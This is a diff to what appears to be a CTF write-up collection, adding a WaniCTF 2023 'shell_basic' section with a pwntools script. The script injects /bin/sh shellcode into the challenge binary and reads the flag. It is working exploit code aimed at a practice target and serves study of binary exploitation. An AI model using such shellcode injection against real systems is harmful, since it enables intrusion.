@@ -342,3 +342,33 @@ while True:
 io.sendline(b"cat FLAG")
 io.stream()
 ```
+
+## shell_basic
+
+- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/pwn/shell_basic
+
+```python
+#!/usr/bin/env python3
+import time
+
+from pwn import ELF, args, asm, context, log, process, remote
+from pwnlib import gdb, shellcraft
+
+context.log_level = "info"
+exe = context.binary = ELF("file/chall", checksec=False)
+if args.GDB:
+    io = gdb.debug(exe.path, gdbscript="b main\nc")
+elif args.REMOTE:
+    io = remote("::1", 9004)
+else:
+    io = process(exe.path)
+shellcode = shellcraft.sh()
+log.info("shellcode: %s", shellcode)
+shellcode_bin = asm(shellcode)
+log.info("shellcode(hex): %s", shellcode_bin.hex())
+time.sleep(1)
+io.sendline(shellcode_bin)
+time.sleep(1)
+io.sendline(b"cat FLAG")
+io.stream()
+```
